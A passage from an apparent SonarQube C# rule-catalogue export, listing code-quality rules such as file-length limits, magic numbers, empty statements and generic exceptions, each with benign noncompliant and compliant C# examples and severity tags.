smaller files will not only be easier to understand but also probably easier to test.</p>",csharpsquid:S104,cs,C#,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",Files should not have too many lines of code,"[{'key': 'maximumFileLocThreshold', 'htmlDesc': 'Maximum authorized lines in a file.', 'defaultValue': '1000', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2018-03-12T12:55:37+0100,"<p>If Finalize or an override of Finalize throws an exception, and the runtime is not hosted by an application that overrides the default policy, the
runtime terminates the process immediately without graceful cleanup (finally blocks and finalizers are not executed). This behavior ensures process
integrity if the finalizer cannot free or destroy resources.</p>
<p>The rule reports on throw statements used in finalizers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
    ~MyClass()
    {
        throw new NotImplementedException(); // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
{
    ~MyClass()
    {
        // no throw
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-5-1 - A class destructor shall not exit with an exception. </li>
</ul>",csharpsquid:S1048,cs,C#,"<p>If Finalize or an override of Finalize throws an exception, and the runtime is not hosted by an application that overrides the default policy, the
runtime terminates the process immediately without graceful cleanup (finally blocks and finalizers are not executed). This behavior ensures process
integrity if the finalizer cannot free or destroy resources.</p>
<p>The rule reports on throw statements used in finalizers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
    ~MyClass()
    {
        throw new NotImplementedException(); // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
{
    ~MyClass()
    {
        // no throw
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-5-1 - A class destructor shall not exit with an exception. </li>
</ul>",Destructors should not throw exceptions,[],BLOCKER,['misra'],BUG
2015-05-20T05:01:17+0200,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",csharpsquid:S105,cs,C#,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",Tabulation characters should not be used,[],MINOR,['convention'],CODE_SMELL
2015-07-27T14:14:23+0200,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1)
{
  if (condition2)
  {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2)
{
  ...
}
</pre>",csharpsquid:S1066,cs,C#,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1)
{
  if (condition2)
  {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2)
{
  ...
}
</pre>","Collapsible ""if"" statements should be merged",[],MAJOR,['clumsy'],CODE_SMELL
2014-06-06T12:02:00+0200,"<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((MyFirstCondition() || MySecondCondition()) &amp;&amp; MyLastCondition()) { ... }
</pre>",csharpsquid:S1067,cs,C#,"<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((MyFirstCondition() || MySecondCondition()) &amp;&amp; MyLastCondition()) { ... }
</pre>",Expressions should not be too complex,"[{'key': 'max', 'htmlDesc': 'Maximum number of allowed conditional operators in an expression', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2014-06-06T12:02:00+0200,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
public void doSomething(int param1, int param2, int param3, string param4, long param5)
{
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, string param4)
{
...
}
</pre>",csharpsquid:S107,cs,C#,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
public void doSomething(int param1, int param2, int param3, string param4, long param5)
{
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, string param4)
{
...
}
</pre>",Methods should not have too many parameters,"[{'key': 'max', 'htmlDesc': 'Maximum authorized number of parameters', 'defaultValue': '7', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2017-07-28T12:37:58+0200,"<p>Hardcoding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hardcoded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hardcoded.</p>
<p>This rule raises an issue when URI's or path delimiters are hardcoded.</p>
<h2>Exceptions</h2>
<p>This rule does not raise an issue when an ASP.NET virtual path is passed as an argument to one of the following:</p>
<ul>
  <li> methods: <code>System.Web.HttpServerUtilityBase.MapPath()</code>, <code>System.Web.HttpRequestBase.MapPath()</code>,
  <code>System.Web.HttpResponseBase.ApplyAppPathModifier()</code>, <code>System.Web.Mvc.UrlHelper.Content()</code> </li>
  <li> all methods of: <code>System.Web.VirtualPathUtility</code> </li>
  <li> constructors of: <code>Microsoft.AspNetCore.Mvc.VirtualFileResult</code>, <code>Microsoft.AspNetCore.Routing.VirtualPathData</code> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",csharpsquid:S1075,cs,C#,"<p>Hardcoding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hardcoded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hardcoded.</p>
<p>This rule raises an issue when URI's or path delimiters are hardcoded.</p>
<h2>Exceptions</h2>
<p>This rule does not raise an issue when an ASP.NET virtual path is passed as an argument to one of the following:</p>
<ul>
  <li> methods: <code>System.Web.HttpServerUtilityBase.MapPath()</code>, <code>System.Web.HttpRequestBase.MapPath()</code>,
  <code>System.Web.HttpResponseBase.ApplyAppPathModifier()</code>, <code>System.Web.Mvc.UrlHelper.Content()</code> </li>
  <li> all methods of: <code>System.Web.VirtualPathUtility</code> </li>
  <li> constructors of: <code>Microsoft.AspNetCore.Mvc.VirtualFileResult</code>, <code>Microsoft.AspNetCore.Routing.VirtualPathData</code> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",URIs should not be hardcoded,[],MINOR,['cert'],CODE_SMELL
2014-06-06T12:02:00+0200,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 42; i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",csharpsquid:S108,cs,C#,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 42; i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",Nested blocks of code should not be left empty,[],MAJOR,['suspicious'],CODE_SMELL
2015-05-20T05:01:17+0200,"<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loops, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void DoSomething()
{
    for(int i = 0; i &lt; 4; i++)  // Noncompliant, 4 is a magic number
    {
        ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private const int NUMBER_OF_CYCLES = 4;

public static void DoSomething()
{
    for(int i = 0; i &lt; NUMBER_OF_CYCLES ; i++)  //Compliant
    {
        ...
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the magic number is used as part of the <code>GetHashCode</code> method or a variable/field declaration.</p>",csharpsquid:S109,cs,C#,"<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loops, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void DoSomething()
{
    for(int i = 0; i &lt; 4; i++)  // Noncompliant, 4 is a magic number
    {
        ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private const int NUMBER_OF_CYCLES = 4;

public static void DoSomething()
{
    for(int i = 0; i &lt; NUMBER_OF_CYCLES ; i++)  //Compliant
    {
        ...
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the magic number is used as part of the <code>GetHashCode</code> method or a variable/field declaration.</p>",Magic numbers should not be used,[],MAJOR,['brain-overload'],CODE_SMELL
2017-04-14T12:33:18+0200,"<p>Inheritance is certainly one of the most valuable concepts in object-oriented programming. It's a way to compartmentalize and reuse code by
creating collections of attributes and behaviors called classes which can be based on previously created classes. But abusing this concept by creating
a deep inheritance tree can lead to very complex and unmaintainable source code. Most of the time a too deep inheritance tree is due to bad object
oriented design which has led to systematically use 'inheritance' when for instance 'composition' would suit better.</p>
<p>This rule raises an issue when the inheritance tree, starting from <code>Object</code> has a greater depth than is allowed. </p>",csharpsquid:S110,cs,C#,"<p>Inheritance is certainly one of the most valuable concepts in object-oriented programming. It's a way to compartmentalize and reuse code by
creating collections of attributes and behaviors called classes which can be based on previously created classes. But abusing this concept by creating
a deep inheritance tree can lead to very complex and unmaintainable source code. Most of the time a too deep inheritance tree is due to bad object
oriented design which has led to systematically use 'inheritance' when for instance 'composition' would suit better.</p>
<p>This rule raises an issue when the inheritance tree, starting from <code>Object</code> has a greater depth than is allowed. </p>",Inheritance tree of classes should not be too deep,"[{'key': 'max', 'htmlDesc': 'Maximum depth of the inheritance tree. (Number)', 'defaultValue': '5', 'type': 'INTEGER'}, {'key': 'filteredClasses', 'htmlDesc': 'Comma-separated list of classes to be filtered out of the count of inheritance. Depth counting will stop when a filtered class is reached. For example: System.Windows.Controls.UserControl, System.Windows.*. (String)', 'type': 'STRING'}]",MAJOR,['design'],CODE_SMELL
2017-04-14T12:33:18+0200,"<p>Public fields in public classes do not respect the encapsulation principle and has three main disadvantages:</p>
<ul>
  <li> Additional behavior such as validation cannot be added. </li>
  <li> The internal representation is exposed, and cannot be changed afterwards. </li>
  <li> Member values are subject to change from anywhere in the code and may not meet the programmer's assumptions. </li>
</ul>
<p>By using private fields and public properties (set and get), unauthorized modifications are prevented. Properties also benefit from additional
protection (security) features such as Link Demands.</p>
<p>Note that due to optimizations on simple properties, public fields provide only very little performance gain.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
    public int instanceData = 32; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
    private int instanceData = 32;

    public int InstanceData
    {
        get { return instanceData; }
	set { instanceData = value ; }
    }
}
</pre>
<h2>Exceptions</h2>
<p>Fields marked as <code>readonly</code> or <code>const</code> are ignored by this rule.</p>
<p>Fields inside classes or structs annotated with the <code>StructLayoutAttribute</code> are ignored by this rule.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/493.html"">MITRE, CWE-493</a> - Critical Public Variable Without Final Modifier </li>
</ul>",csharpsquid:S1104,cs,C#,"<p>Public fields in public classes do not respect the encapsulation principle and has three main disadvantages:</p>
<ul>
  <li> Additional behavior such as validation cannot be added. </li>
  <li> The internal representation is exposed, and cannot be changed afterwards. </li>
  <li> Member values are subject to change from anywhere in the code and may not meet the programmer's assumptions. </li>
</ul>
<p>By using private fields and public properties (set and get), unauthorized modifications are prevented. Properties also benefit from additional
protection (security) features such as Link Demands.</p>
<p>Note that due to optimizations on simple properties, public fields provide only very little performance gain.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
    public int instanceData = 32; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
    private int instanceData = 32;

    public int InstanceData
    {
        get { return instanceData; }
	set { instanceData = value ; }
    }
}
</pre>
<h2>Exceptions</h2>
<p>Fields marked as <code>readonly</code> or <code>const</code> are ignored by this rule.</p>
<p>Fields inside classes or structs annotated with the <code>StructLayoutAttribute</code> are ignored by this rule.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/493.html"">MITRE, CWE-493</a> - Critical Public Variable Without Final Modifier </li>
</ul>",Fields should not have public accessibility,[],MINOR,['cwe'],VULNERABILITY
2014-06-06T12:02:00+0200,"<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the
beginning of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>",csharpsquid:S1109,cs,C#,"<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the
beginning of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>",A close curly brace should be located at the beginning of a line,[],MINOR,['convention'],CODE_SMELL
2017-12-20T09:38:25+0100,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a &amp;&amp; ((x + y &gt; 0))) // Noncompliant
{
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a &amp;&amp; (x + y &gt; 0))
{
  //...
}

return x + 1;

return (x + 1);
</pre>",csharpsquid:S1110,cs,C#,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a &amp;&amp; ((x + y &gt; 0))) // Noncompliant
{
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a &amp;&amp; (x + y &gt; 0))
{
  //...
}

return x + 1;

return (x + 1);
</pre>",Redundant pairs of parentheses should be removed,[],MAJOR,['confusing'],CODE_SMELL
2014-06-06T12:02:00+0200,"<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething()
{
  ; // Noncompliant - was used as a kind of TODO marker
}

void doSomethingElse()
{
  Console.WriteLine(""Hello, world!"");;  // Noncompliant - double ;
  ...
  // Rarely, they are used on purpose as the body of a loop. It is a bad practice to
  // have side-effects outside of the loop:
  for (int i = 0; i &lt; 3; Console.WriteLine(i), i++); // Noncompliant
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething()
{
}

void doSomethingElse()
{
  Console.WriteLine(""Hello, world!"");
  ...
  for (int i = 0; i &lt; 3; i++)
  {
    Console.WriteLine(i);
   }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7gCTAw"">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4FtAg"">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>",csharpsquid:S1116,cs,C#,"<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething()
{
  ; // Noncompliant - was used as a kind of TODO marker
}

void doSomethingElse()
{
  Console.WriteLine(""Hello, world!"");;  // Noncompliant - double ;
  ...
  // Rarely, they are used on purpose as the body of a loop. It is a bad practice to
  // have side-effects outside of the loop:
  for (int i = 0; i &lt; 3; Console.WriteLine(i), i++); // Noncompliant
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething()
{
}

void doSomethingElse()
{
  Console.WriteLine(""Hello, world!"");
  ...
  for (int i = 0; i &lt; 3; i++)
  {
    Console.WriteLine(i);
   }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7gCTAw"">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4FtAg"">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>",Empty statements should be removed,[],MINOR,"['cert', 'misra', 'unused']",CODE_SMELL
2015-07-27T14:14:23+0200,"<p>Shadowing fields with a local variable is a bad practice that reduces code readability: it makes it confusing to know whether the field or the
variable is being used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo
{
  public int myField;

  public void DoSomething()
  {
    int myField = 0;  // Noncompliant
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/2ADEAw"">CERT, DCL51-J.</a> - Do not shadow or obscure identifiers in subscopes </li>
</ul>",csharpsquid:S1117,cs,C#,"<p>Shadowing fields with a local variable is a bad practice that reduces code readability: it makes it confusing to know whether the field or the
variable is being used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo
{
  public int myField;

  public void DoSomething()
  {
    int myField = 0;  // Noncompliant
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/2ADEAw"">CERT, DCL51-J.</a> - Do not shadow or obscure identifiers in subscopes </li>
</ul>",Local variables should not shadow class fields,[],MAJOR,"['cert', 'pitfall']",CODE_SMELL
2015-07-27T14:14:22+0200,"<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated.</p>
<p>C# adds an implicit public constructor to every class which does not explicitly define at least one constructor. Hence, at least one
<code>protected</code> constructor should be defined if you wish to subclass this utility class. Or the <code>static</code> keyword should be added to
the class declaration to prevent subclassing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class StringUtils // Noncompliant
{
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static class StringUtils
{
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>
<p>or</p>
<pre>
public class StringUtils
{
  protected StringUtils()
  {
  }
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>",csharpsquid:S1118,cs,C#,"<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated.</p>
<p>C# adds an implicit public constructor to every class which does not explicitly define at least one constructor. Hence, at least one
<code>protected</code> constructor should be defined if you wish to subclass this utility class. Or the <code>static</code> keyword should be added to
the class declaration to prevent subclassing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class StringUtils // Noncompliant
{
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static class StringUtils
{
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>
<p>or</p>
<pre>
public class StringUtils
{
  protected StringUtils()
  {
  }
  public static string Concatenate(string s1, string s2)
  {
    return s1 + s2;
  }
}
</pre>",Utility classes should not have public constructors,[],MAJOR,['design'],CODE_SMELL
2017-02-03T13:58:45+0100,"<p>Throwing such general exceptions as <code>Exception</code>, <code>SystemException</code>, <code>ApplicationException</code>,
<code>IndexOutOfRangeException</code>, <code>NullReferenceException</code>, <code>OutOfMemoryException</code> and
<code>ExecutionEngineException</code> prevents calling methods from handling true, system-generated exceptions differently than application-generated
errors. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void DoSomething(object obj)
{
  if (obj == null)
  {
    throw new NullReferenceException(""obj"");  // Noncompliant
  }
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void DoSomething(object obj)
{
  if (obj == null)
  {
    throw new ArgumentNullException(""obj"");
  }
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/397.html"">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BoB3AQ"">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>",csharpsquid:S112,cs,C#,"<p>Throwing such general exceptions as <code>Exception</code>, <code>SystemException</code>, <code>ApplicationException</code>,
<code>IndexOutOfRangeException</code>, <code>NullReferenceException</code>, <code>OutOfMemoryException</code> and
<code>ExecutionEngineException</code> prevents calling methods from handling true, system-generated exceptions differently than application-generated
errors. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void DoSomething(object obj)
{
  if (obj == null)
  {
    throw new NullReferenceException(""obj"");  // Noncompliant
  }
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void DoSomething(object obj)
{
  if (obj == null)
  {
    throw new ArgumentNullException(""obj"");
  }
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/397.html"">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BoB3AQ"">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>",General exceptions should never be thrown,[],MAJOR,"['cert', 'cwe', 'error-handling']",CODE_SMELL
2015-05-20T05:01:17+0200,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (string.IsNullOrEmpty(result = str.Substring(index, length))) // Noncompliant
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var result = str.Substring(index, length);
if (string.IsNullOrEmpty(result))
{
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Assignments inside lambda and delegate expressions are allowed. </p>
<p>Furthermore, the following patterns are also accepted:</p>
<pre>
var a = b = c = 10;
</pre>
<pre>
while ((val = GetNewValue()) &gt; 0)
{
...
}
</pre>
<pre>
private MyClass instance;
public MyClass Instance
{
  get
  {
    return instance ?? (instance = new MyClass());
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",csharpsquid:S1121,cs,C#,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (string.IsNullOrEmpty(result = str.Substring(index, length))) // Noncompliant
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var result = str.Substring(index, length);
if (string.IsNullOrEmpty(result))
{
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Assignments inside lambda and delegate expressions are allowed. </p>
<p>Furthermore, the following patterns are also accepted:</p>
<pre>
var a = b = c = 10;
</pre>
<pre>
while ((val = GetNewValue()) &gt; 0)
{
...
}
</pre>
<pre>
private MyClass instance;
public MyClass Instance
{
  get
  {
    return instance ?? (instance = new MyClass());
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",Assignments should not be made from within sub-expressions,[],MAJOR,"['cert', 'cwe', 'misra', 'suspicious']",CODE_SMELL
2017-06-22T07:35:07+0200,"<p>The <code>Obsolete</code> attribute can be applied with or without arguments, but marking something <code>Obsolete</code> without including advice
as to why it's obsolete or on what to use instead will lead maintainers to waste time trying to figure those things out - every single time the
warning is encountered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Car
{

  [Obsolete]  // Noncompliant
  public void CrankEngine(int turnsOfCrank)
  { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Car
{

  [Obsolete(""Replaced by the automatic starter"")]
  public void CrankEngine(int turnsOfCrank)
  { ... }
}
</pre>",csharpsquid:S1123,cs,C#,"<p>The <code>Obsolete</code> attribute can be applied with or without arguments, but marking something <code>Obsolete</code> without including advice
as to why it's obsolete or on what to use instead will lead maintainers to waste time trying to figure those things out - every single time the
warning is encountered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Car
{

  [Obsolete]  // Noncompliant
  public void CrankEngine(int turnsOfCrank)
  { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Car
{

  [Obsolete(""Replaced by the automatic starter"")]
  public void CrankEngine(int turnsOfCrank)
  { ... }
}
</pre>","""Obsolete"" attributes should include explanations",[],MAJOR,"['bad-practice', 'obsolete']",CODE_SMELL
2014-06-06T12:02:00+0200,"<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (booleanMethod() == true) { /* ... */ }
if (booleanMethod() == false) { /* ... */ }
if (booleanMethod() || false) { /* ... */ }
doSomething(!false);
doSomething(booleanMethod() == true);

booleanVariable = booleanMethod() ? true : false;
booleanVariable = booleanMethod() ? true : exp;
booleanVariable = booleanMethod() ? false : exp;
booleanVariable = booleanMethod() ? exp : true;
booleanVariable = booleanMethod() ? exp : false;

for (var x = 0; true; x++)
{
 ...
}
</pre>
